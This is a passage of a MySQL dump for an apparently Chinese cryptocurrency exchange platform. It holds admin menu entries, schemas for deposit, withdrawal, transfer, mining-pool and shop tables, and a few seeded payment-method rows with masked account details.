INSERT INTO `movesay_menu` VALUES ('129', '修改管理员密码', '3', '0', 'User/setpwd', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('131', '用户详情', '3', '4', 'User/detail', '1', '', '前台用户管理', '0', 'time');
INSERT INTO `movesay_menu` VALUES ('132', '后台用户详情', '3', '1', 'AdminUser/detail', '1', '', '后台用户管理', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('133', '后台用户状态', '3', '1', 'AdminUser/status', '1', '', '后台用户管理', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('134', '后台用户新增', '3', '1', 'AdminUser/add', '1', '', '后台用户管理', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('135', '后台用户编辑', '3', '1', 'AdminUser/edit', '1', '', '后台用户管理', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('138', '编辑', '2', '1', 'Articletype/edit', '1', '', '内容管理', '0', 'list-alt');
INSERT INTO `movesay_menu` VALUES ('140', '编辑', '139', '2', 'Link/edit', '1', '', '内容管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('141', '修改', '139', '2', 'Link/status', '1', '', '内容管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('155', '服务器队列', '9', '3', 'Tools/queue', '0', '', '工具', '0', 'wrench');
INSERT INTO `movesay_menu` VALUES ('156', '钱包检查', '9', '3', 'Tools/qianbao', '0', '', '工具', '0', 'wrench');
INSERT INTO `movesay_menu` VALUES ('157', '币种统计', '1', '2', 'Index/coin', '0', '', '系统', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('158', '自动升级', '10', '2', 'Cloud/update', '0', '', '扩展', '0', 'tasks');
INSERT INTO `movesay_menu` VALUES ('163', '提示文字', '7', '5', 'Config/text', '0', '', '设置', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('220', '币种评论', '5', '4', 'Trade/comment', '0', '', '交易', '0', 'stats');
INSERT INTO `movesay_menu` VALUES ('237', '应用管理', '10', '3', 'Cloud/game', '0', '', '扩展', '0', 'tasks');
INSERT INTO `movesay_menu` VALUES ('278', '文章类型', '2', '2', 'Article/type', '0', '', '内容', '0', 'list-alt');
INSERT INTO `movesay_menu` VALUES ('279', '广告管理', '2', '3', 'Article/adver', '0', '', '内容', '0', 'list-alt');
INSERT INTO `movesay_menu` VALUES ('280', '友情链接', '2', '4', 'Article/link', '0', '', '内容', '0', 'list-alt');
INSERT INTO `movesay_menu` VALUES ('282', '登陆日志', '3', '4', 'User/log', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('283', '用户钱包', '3', '5', 'User/qianbao', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('284', '提现地址', '3', '6', 'User/bank', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('285', '用户财产', '3', '7', 'User/coin', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('286', '联系地址', '3', '8', 'User/goods', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('287', '交易聊天', '5', '3', 'Trade/chat', '0', '', '交易', '0', 'stats');
INSERT INTO `movesay_menu` VALUES ('288', '交易市场', '5', '5', 'Trade/market', '0', '', '交易', '0', 'stats');
INSERT INTO `movesay_menu` VALUES ('289', '交易推荐', '5', '6', 'Trade/invit', '0', '', '交易', '0', 'stats');
INSERT INTO `movesay_menu` VALUES ('290', '财务明细', '4', '1', 'Finance/index', '0', '', '财务', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('291', '美元充值', '4', '2', 'Finance/mycz', '0', '', '财务', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('292', '美元充值方式', '4', '3', 'Finance/myczType', '0', '', '财务', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('293', '美元提现', '4', '4', 'Finance/mytx', '0', '', '财务', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('294', '美元提现配置', '4', '5', 'Finance/mytxConfig', '0', '', '财务', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('295', '虚拟币转入', '4', '6', 'Finance/myzr', '0', '', '财务', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('296', '虚拟币转出', '4', '7', 'Finance/myzc', '0', '', '财务', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('297', '修改状态', '291', '100', 'Finance/myczStatus', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('298', '确认到账', '291', '100', 'Finance/myczQueren', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('299', '编辑添加', '292', '1', 'Finance/myczTypeEdit', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('300', '状态修改', '292', '2', 'Finance/myczTypeStatus', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('301', '上传图片', '292', '2', 'Finance/myczTypeImage', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('302', '修改状态', '293', '2', 'Finance/mytxStatus', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('303', '导出选中', '293', '3', 'Finance/mytxExcel', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('304', '正在处理', '293', '4', 'Finance/mytxChuli', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('305', '撤销提现', '293', '5', 'Finance/mytxChexiao', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('306', '确认提现', '293', '6', 'Finance/mytxQueren', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('307', '确认转出', '296', '6', 'Finance/myzcQueren', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('308', '云市场', '10', '1', 'Cloud/index', '0', '', '扩展', '0', 'tasks');
INSERT INTO `movesay_menu` VALUES ('309', '清理缓存', '9', '1', 'Tools/index', '0', '', '工具', '0', 'wrench');
INSERT INTO `movesay_menu` VALUES ('310', '备份数据库', '9', '2', 'Tools/dataExport', '0', '', '工具', '0', 'wrench');
INSERT INTO `movesay_menu` VALUES ('311', '还原数据库', '9', '2', 'Tools/dataImport', '0', '', '工具', '0', 'wrench');
INSERT INTO `movesay_menu` VALUES ('312', '管理员管理', '3', '2', 'User/admin', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('313', '权限列表', '3', '3', 'User/auth', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('314', '编辑添加', '26', '1', 'User/edit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('315', '修改状态', '26', '1', 'User/status', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('316', '编辑添加', '312', '1', 'User/adminEdit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('317', '修改状态', '312', '1', 'User/adminStatus', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('318', '编辑添加', '313', '1', 'User/authEdit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('319', '修改状态', '313', '1', 'User/authStatus', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('320', '重新初始化权限', '313', '1', 'User/authStart', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('321', '编辑添加', '282', '1', 'User/logEdit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('322', '修改状态', '282', '1', 'User/logStatus', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('323', '编辑添加', '283', '1', 'User/qianbaoEdit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('324', '修改状态', '283', '1', 'User/qianbaoStatus', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('325', '编辑添加', '284', '1', 'User/bankEdit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('326', '修改状态', '284', '1', 'User/bankStatus', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('327', '编辑添加', '285', '1', 'User/coinEdit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('328', '财产统计', '285', '1', 'User/coinLog', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('329', '编辑添加', '286', '1', 'User/goodsEdit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('330', '修改状态', '286', '1', 'User/goodsStatus', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('331', '编辑添加', '278', '1', 'Article/typeEdit', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('332', '修改状态', '278', '100', 'Article/typeStatus', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('333', '编辑添加', '280', '1', 'Article/linkEdit', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('334', '修改状态', '280', '100', 'Article/linkStatus', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('335', '编辑添加', '279', '1', 'Article/adverEdit', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('336', '修改状态', '279', '100', 'Article/adverStatus', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('337', '上传图片', '279', '100', 'Article/adverImage', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('375', '客服代码', '10', '5', 'Cloud/kefu', '0', '', '扩展', '0', 'tasks');
INSERT INTO `movesay_menu` VALUES ('376', '使用', '375', '5', 'Cloud/kefuUp', '0', '', '扩展', '0', 'tasks');
INSERT INTO `movesay_menu` VALUES ('377', '访问授权', '313', '1', 'User/authAccess', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('378', '访问授权修改', '313', '1', 'User/authAccessUp', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('379', '成员授权', '313', '1', 'User/authUser', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('380', '成员授权增加', '313', '1', 'User/authUserAdd', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('381', '成员授权解除', '313', '1', 'User/authUserRemove', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('382', '币种配置', '7', '4', 'Config/coin', '0', '', '设置', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('383', '推广奖励', '8', '1', 'Operate/index', '0', '', '运营', '0', 'share');
INSERT INTO `movesay_menu` VALUES ('384', 'APP配置', '8', '1', 'App/config', '0', '', 'APP管理', '0', 'time');
INSERT INTO `movesay_menu` VALUES ('385', 'APP等级', '8', '2', 'App/vip_config_list', '0', '', 'APP管理', '0', 'time');
INSERT INTO `movesay_menu` VALUES ('386', 'APP广告板块', '8', '3', 'App/adsblock_list', '0', '', 'APP管理', '0', 'time');
INSERT INTO `movesay_menu` VALUES ('387', 'APP广告用户', '8', '4', 'App/ads_user', '0', '', 'APP管理', '0', 'time');
INSERT INTO `movesay_menu` VALUES ('388', '导航配置', '7', '7', 'Config/daohang', '0', '', '设置', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('418', '主题模板', '10', '4', 'Cloud/theme', '0', '', '扩展', '0', 'tasks');
INSERT INTO `movesay_menu` VALUES ('425', '商品管理', '6', '1', 'Shop/index', '0', '', '商城管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('426', '商城配置', '6', '2', 'Shop/config', '0', '', '商城管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('427', '商品类型', '6', '3', 'Shop/type', '0', '', '商城管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('428', '付款方式', '6', '4', 'Shop/coin', '0', '', '商城管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('429', '购物记录', '6', '5', 'Shop/log', '0', '', '商城管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('430', '收货地址', '6', '6', 'Shop/goods', '0', '', '商城管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('431', '认购管理', '6', '1', 'Issue/index', '0', '', '认购管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('432', '认购记录', '6', '1', 'Issue/log', '0', '', '认购管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('433', '分红管理', '6', '3', 'Fenhong/index', '0', '', '分红管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('434', '分红记录', '6', '5', 'Fenhong/log', '0', '', '分红管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('435', '充值记录', '6', '1', 'Huafei/index', '0', '', '话费充值', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('436', '充值配置', '6', '1', 'Huafei/config', '0', '', '话费充值', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('437', '充值金额', '6', '3', 'Huafei/type', '0', '', '话费充值', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('438', '付款方式', '6', '4', 'Huafei/coin', '0', '', '话费充值', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('448', '用户财产日志', '3', '100', 'User/coinlogs', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('441', '理财管理', '6', '1', 'Money/index', '0', '', '理财管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('442', '理财日志', '6', '2', 'Money/log', '0', '', '理财管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('443', '理财明细', '6', '3', 'Money/fee', '0', '', '理财管理', '0', 'globe');

-- ----------------------------
-- Table structure for `movesay_message`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_message`;
CREATE TABLE `movesay_message` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(10) unsigned NOT NULL,
  `type` varchar(50) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `addip` varchar(200) NOT NULL,
  `addr` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(10) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_message
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_message_log`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_message_log`;
CREATE TABLE `movesay_message_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(10) unsigned NOT NULL,
  `type` varchar(50) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `addip` varchar(200) NOT NULL,
  `addr` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(10) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_message_log
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_money`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_money`;
CREATE TABLE `movesay_money` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `num` bigint(20) unsigned NOT NULL DEFAULT '0',
  `deal` int(11) unsigned NOT NULL DEFAULT '0',
  `tian` int(11) unsigned NOT NULL,
  `fee` int(11) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='投资理财表';

-- ----------------------------
-- Records of movesay_money
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_money_fee`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_money_fee`;
CREATE TABLE `movesay_money_fee` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `money_id` int(11) NOT NULL,
  `type` tinyint(4) NOT NULL,
  `num` int(6) NOT NULL,
  `content` varchar(255) NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_money_fee
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_money_log`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_money_log`;
CREATE TABLE `movesay_money_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `name` varchar(50) NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `num` int(11) unsigned NOT NULL,
  `fee` decimal(20,8) unsigned NOT NULL,
  `feea` decimal(20,8) unsigned NOT NULL,
  `tian` int(11) unsigned NOT NULL,
  `tiana` int(11) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  `money_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='理财记录表';

-- ----------------------------
-- Records of movesay_money_log
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_mycz`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_mycz`;
CREATE TABLE `movesay_mycz` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `num` int(11) unsigned NOT NULL,
  `mum` int(11) unsigned NOT NULL,
  `type` varchar(50) NOT NULL,
  `tradeno` varchar(50) NOT NULL,
  `remark` varchar(250) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=145 DEFAULT CHARSET=utf8 COMMENT='充值记录表';

-- ----------------------------
-- Records of movesay_mycz
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_mycz_invit`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_mycz_invit`;
CREATE TABLE `movesay_mycz_invit` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `userid` int(11) unsigned NOT NULL COMMENT '用户id',
  `invitid` int(11) unsigned NOT NULL COMMENT '推荐人id',
  `num` decimal(20,2) unsigned NOT NULL COMMENT '操作金额',
  `fee` decimal(20,8) unsigned NOT NULL COMMENT '赠送金额',
  `coinname` varchar(50) NOT NULL COMMENT '赠送币种',
  `mum` decimal(20,8) unsigned NOT NULL COMMENT '到账金额',
  `remark` varchar(250) NOT NULL COMMENT '备注',
  `sort` int(11) unsigned NOT NULL COMMENT '排序',
  `addtime` int(11) unsigned NOT NULL COMMENT '添加时间',
  `endtime` int(11) unsigned NOT NULL COMMENT '编辑时间',
  `status` tinyint(4) NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='充值赠送';

-- ----------------------------
-- Records of movesay_mycz_invit
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_mycz_type`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_mycz_type`;
CREATE TABLE `movesay_mycz_type` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `max` varchar(200) NOT NULL COMMENT '名称',
  `min` varchar(200) NOT NULL COMMENT '名称',
  `kaihu` varchar(200) NOT NULL COMMENT '名称',
  `truename` varchar(200) NOT NULL COMMENT '名称',
  `name` varchar(50) NOT NULL,
  `title` varchar(50) NOT NULL,
  `url` varchar(50) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `img` varchar(50) NOT NULL,
  `extra` varchar(50) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8 COMMENT='充值类型';

-- ----------------------------
-- Records of movesay_mycz_type
-- ----------------------------
INSERT INTO `movesay_mycz_type` VALUES ('1', '', '', '**********', '***', 'alipay', '支付宝转账支付', '', '***********', '', '5811a25804514.jpg', '', '需要在联系方式里面设置支付宝账号', '0', '0', '0', '1');
INSERT INTO `movesay_mycz_type` VALUES ('2', '', '', '************', '***', 'weixin', '微信转账支付', '', '*************', '', '5811a215e4828.jpg', '', '需要在联系方式里面设置微信账号', '0', '0', '0', '1');
INSERT INTO `movesay_mycz_type` VALUES ('3', '100000', '0.0000001', '***********', '***', 'bank', '网银转账支付', '', 'admin888', 'admin888', '5811a1f5d9910.jpg', '', '需要在联系方式里面按照格式天数收款银行账号', '0', '0', '0', '1');

-- ----------------------------
-- Table structure for `movesay_mytx`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_mytx`;
CREATE TABLE `movesay_mytx` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `num` int(11) unsigned NOT NULL,
  `fee` decimal(20,2) unsigned NOT NULL,
  `mum` decimal(20,2) unsigned NOT NULL,
  `truename` varchar(32) NOT NULL,
  `name` varchar(32) NOT NULL,
  `bank` varchar(250) NOT NULL,
  `bankprov` varchar(50) NOT NULL,
  `bankcity` varchar(50) NOT NULL,
  `bankaddr` varchar(50) NOT NULL,
  `bankcard` varchar(200) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='提现记录表';

-- ----------------------------
-- Records of movesay_mytx
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_myzc`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_myzc`;
CREATE TABLE `movesay_myzc` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `username` varchar(200) NOT NULL,
  `coinname` varchar(200) NOT NULL,
  `txid` varchar(200) NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `fee` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`),
  KEY `coinname` (`coinname`)
) ENGINE=MyISAM AUTO_INCREMENT=29704 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_myzc
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_myzc_fee`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_myzc_fee`;
CREATE TABLE `movesay_myzc_fee` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `username` varchar(200) COLLATE utf8_unicode_ci NOT NULL,
  `coinname` varchar(200) COLLATE utf8_unicode_ci NOT NULL,
  `txid` varchar(200) COLLATE utf8_unicode_ci NOT NULL,
  `type` varchar(200) COLLATE utf8_unicode_ci NOT NULL,
  `fee` decimal(20,8) NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=404 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of movesay_myzc_fee
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_myzr`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_myzr`;
CREATE TABLE `movesay_myzr` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `username` varchar(200) NOT NULL,
  `coinname` varchar(200) NOT NULL,
  `txid` varchar(200) NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `fee` decimal(20,8) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`),
  KEY `coinname` (`coinname`)
) ENGINE=MyISAM AUTO_INCREMENT=18129 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_myzr
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_pool`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_pool`;
CREATE TABLE `movesay_pool` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `ico` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `tian` int(11) unsigned NOT NULL,
  `limit` varchar(50) NOT NULL,
  `power` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='矿机类型表';

-- ----------------------------
-- Records of movesay_pool
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_pool_log`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_pool_log`;
CREATE TABLE `movesay_pool_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `name` varchar(50) NOT NULL,
  `ico` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `tian` int(11) unsigned NOT NULL,
  `limit` varchar(50) NOT NULL,
  `power` varchar(50) NOT NULL,
  `num` int(11) unsigned NOT NULL,
  `use` int(11) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='矿机管理';

-- ----------------------------
-- Records of movesay_pool_log
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_prompt`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_prompt`;
CREATE TABLE `movesay_prompt` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL,
  `title` varchar(200) NOT NULL,
  `url` varchar(200) NOT NULL,
  `img` varchar(200) NOT NULL,
  `mytx` varchar(200) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_prompt
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_shop`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_shop`;
CREATE TABLE `movesay_shop` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `coinlist` varchar(255) NOT NULL,
  `img` varchar(255) NOT NULL,
  `type` varchar(255) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL DEFAULT '0.00000000',
  `num` decimal(20,8) unsigned NOT NULL DEFAULT '0.00000000',
  `deal` decimal(20,8) unsigned NOT NULL DEFAULT '0.00000000',
  `content` text NOT NULL,
  `max` varchar(255) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL DEFAULT '0',
  `market_price` decimal(20,2) unsigned NOT NULL COMMENT '市场价',
  PRIMARY KEY (`id`),
  KEY `name` (`name`),
  KEY `status` (`status`),
  KEY `deal` (`deal`),
  KEY `price` (`price`)
) ENGINE=MyISAM AUTO_INCREMENT=29 DEFAULT CHARSET=utf8 COMMENT='商城商品表';

-- ----------------------------
-- Records of movesay_shop
-- ----------------------------
